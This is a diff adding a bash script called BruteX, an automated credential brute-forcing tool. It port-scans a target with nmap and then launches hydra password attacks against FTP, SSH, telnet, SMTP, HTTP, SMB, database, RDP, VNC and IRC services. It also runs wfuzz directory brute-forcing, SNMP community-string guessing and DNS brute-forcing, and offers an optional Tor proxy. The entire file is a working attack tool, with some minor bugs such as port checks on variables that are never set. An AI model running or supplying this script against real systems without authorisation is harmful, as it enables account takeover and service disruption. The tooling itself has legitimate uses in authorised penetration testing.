@@ -1,0 +1,270 @@
+#!/bin/bash
+# BruteX v1.0 by 1N3
+# http://crowdshield.com
+#
+# ABOUT:
+# BruteX is a simple bash script used to brute force all services on a target.
+#
+# USAGE:
+# ./brutex <IP/hostname>
+#
+# DEPENDENCIES:
+# 1. NMap
+# 2. Hydra
+# 3. Wfuzz
+# 4. SNMPWalk
+# 5. DNSDict
+#
+# HYDRA SERVICES: 
+# asterisk cisco cisco-enable cvs ftp ftps http[s]-{head|get} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp
+
+
+TARGET="$1"
+LOOT_DIR=$PWD
+USER_FILE="simple-users.txt"
+PASS_FILE="password.lst"
+DNS_FILE="namelist.txt"
+DIRBUST_FILE="dirbuster.txt"
+EXT_FILE="dirbuster-ext.txt"
+THREADS="30"
+COLOR1='\033[91m'
+COLOR2='\033[92m'
+COLOR3='\033[92m'
+RESET='\e[0m'
+
+# UN-COMMENT TO ENABLE PROXY
+#export HYDRA_PROXY=socks4://127.0.0.1:9050
+
+if [ -z $TARGET ]; then
+	echo -e "$COLOR1 __________                __         ____  ___$RESET"
+	echo -e "$COLOR1 \______   \_______ __ ___/  |_  ____ \   \/  /$RESET"
+	echo -e "$COLOR1  |    |  _/\_  __ \  |  \   __\/ __ \ \     / $RESET"
+	echo -e "$COLOR1  |    |   \ |  | \/  |  /|  | \  ___/ /     \ $RESET"
+	echo -e "$COLOR1  |______  / |__|  |____/ |__|  \___  >___/\  \ $RESET"
+	echo -e "$COLOR1         \/                         \/      \_/$RESET"
+	echo ""
+	echo -e "$COLOR1 + -- --=[BruteX v1.0 by 1N3$RESET"
+	echo -e "$COLOR1 + -- --=[http://crowdshield.com$RESET"
+	echo -e "$COLOR1 + -- --=[Usage: brutex <target IP/hostname>"
+	echo ""
+	exit
+fi
+
+clear
+
+echo -e "$COLOR1 __________                __         ____  ___$RESET"
+echo -e "$COLOR1 \______   \_______ __ ___/  |_  ____ \   \/  /$RESET"
+echo -e "$COLOR1  |    |  _/\_  __ \  |  \   __\/ __ \ \     / $RESET"
+echo -e "$COLOR1  |    |   \ |  | \/  |  /|  | \  ___/ /     \ $RESET"
+echo -e "$COLOR1  |______  / |__|  |____/ |__|  \___  >___/\  \ $RESET"
+echo -e "$COLOR1         \/                         \/      \_/$RESET"
+echo ""
+echo -e "$COLOR1 + -- --=[BruteX v1.0 by 1N3$RESET"
+echo -e "$COLOR1 + -- --=[http://crowdshield.com$RESET"
+echo ""
+echo ""
+
+echo -e "$COLOR3################################### Running Port Scan ##############################$RESET"
+nmap -T4 --open $TARGET -oX $LOOT_DIR/nmap/$TARGET.xml
+echo ""
+echo -e "$COLOR3################################### Running Brute Force ############################$RESET"
+port_21=`grep 'portid="21"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_22=`grep 'portid="22"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_23=`grep 'portid="23"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_25=`grep 'portid="25"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_80=`grep 'portid="80"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_110=`grep 'portid="110"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_111=`grep 'portid="111"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_135=`grep 'portid="135"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_139=`grep 'portid="139"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_162=`grep 'portid="162"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_443=`grep 'portid="443"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_445=`grep 'portid="445"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_993=`grep 'portid="993"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_1433=`grep 'portid="1433"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_3389=`grep 'portid="3389"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_5432=`grep 'portid="5432"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_5900=`grep 'portid="5900"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_5901=`grep 'portid="5901"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_8000=`grep 'portid="8000"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+port_6667=`grep 'portid="6667"' $LOOT_DIR/nmap/$TARGET.xml | grep open`
+
+if [ -z "$port_21" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 21 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 21 opened... running tests...$RESET"	
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET ftp -t $THREADS -e ns
+fi
+
+if [ -z "$port_22" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 22 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 22 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET ssh -t $THREADS -e ns
+fi
+
+if [ -z "$port_23" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 23 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 23 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET telnet -t $THREADS -e ns
+fi
+
+if [ -z "$port_25" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 25 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 25 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET smtp-enum -t $THREADS -e ns
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET smtp -t $THREADS -e ns
+fi
+
+if [ -z "$port_80" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 80 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 80 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -t $THREADS -e ns -m /
+	wfuzz -z file,$DIRBUST_FILE --hc 404,403,400,301,401 -c -t $THREADS http://$TARGET/FUZZ/
+	wfuzz -z file,$DIRBUST_FILE -z file,$EXT_FILE --hc 404,403,400,301,401 -c -t $THREADS http://$TARGET/FUZZ.FUZ2Z
+fi
+
+if [ -z "$port_110" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 110 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 110 opened... running tests...$RESET"	
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET pop3 -t $THREADS -e ns
+fi
+
+if [ -z "$port_139" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 139 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 139 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET smb -S 139 -t $THREADS -e ns
+fi
+
+if [ -z "$port_162" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 162 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 162 opened... running tests...$RESET"
+	for a in `cat /pentest/lists/wordlist-common-snmp-community-strings.txt`; do snmpwalk $TARGET -c $a; done;
+fi
+
+if [ -z "$port_443" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 443 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 443 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -t $THREADS -e ns -m /
+	wfuzz -z file,$DIRBUST_FILE --hc 404,403,400,301,401 -c -t $THREADS https://$TARGET/FUZZ/
+	wfuzz -z file,$DIRBUST_FILE -z file,$EXT_FILE --hc 404,403,400,301,401 -c -t $THREADS https://$TARGET/FUZZ.FUZ2Z
+fi
+
+if [ -z "$port_445" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 445 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 445 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET smb -S 445 -t $THREADS -e ns 
+fi
+
+if [ -z "$port_993" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 993 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 993 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET imap -S 993 -t $THREADS -e ns 
+fi
+
+if [ -z "$port_1433" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 1433 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 1433 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET mssql -S 1433 -t $THREADS -e ns 
+fi
+
+if [ -z "$port_3306" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 3306 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 3306 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET mysql -t $THREADS -e ns
+fi
+
+if [ -z "$port_3389" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 3389 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 3389 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET rdp -t $THREADS -e ns
+fi
+
+if [ -z "$port_5900" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 5900 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 5900 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET vnc -t $THREADS -e ns
+fi
+
+if [ -z "$port_5901" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 5901 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 5901 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET vnc -S 5901 -t $THREADS -e ns
+fi
+
+if [ -z "$port_8000" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 8000 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 8000 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -s 8000 -t $THREADS -e ns -m /
+	wfuzz -z file,$DIRBUST_FILE --hc 404,403,400,301,401 -c -t $THREADS http://$TARGET:8000/FUZZ/
+	wfuzz -z file,$DIRBUST_FILE -z file,$EXT_FILE --hc 404,403,400,301,401 -c -t $THREADS http://$TARGET:8000/FUZZ.FUZ2Z
+fi
+
+if [ -z "$port_8100" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 8100 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 8100 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -s 8100 -t $THREADS -e ns -m /
+	wfuzz -z file,$DIRBUST_FILE --hc 404,403,400,301,401 -c -t $THREADS http://$TARGET:8100/FUZZ/
+	wfuzz -z file,$DIRBUST_FILE -z file,$EXT_FILE --hc 404,403,400,301,401 -c -t $THREADS http://$TARGET:8100/FUZZ.FUZ2Z
+fi
+
+if [ -z "$port_8080" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 8080 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 8080 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -s 8080 -t $THREADS -e ns -m /
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET http-proxy -s 8080 -t $THREADS -e ns
+	wfuzz -z file,$DIRBUST_FILE --hc 404,403,400,301,401 -c -t $THREADS http://$TARGET:8080/FUZZ/
+	wfuzz -z file,$DIRBUST_FILE -z file,$EXT_FILE --hc 404,403,400,301,401 -c -t $THREADS http://$TARGET:8080/FUZZ.FUZ2Z
+fi
+
+if [ -z "$port_6667" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 6667 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 6667 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET irc -s 6667 -t $THREADS -e ns
+fi
+
+echo ""
+echo -e "$COLOR3################################### Brute Forcing DNS ###############################$RESET"
+dnsdict6 $TARGET $DNS_FILE -4
+echo ""
+echo -e "$COLOR3################################### Done! ###########################################$RESET"
+exit 0
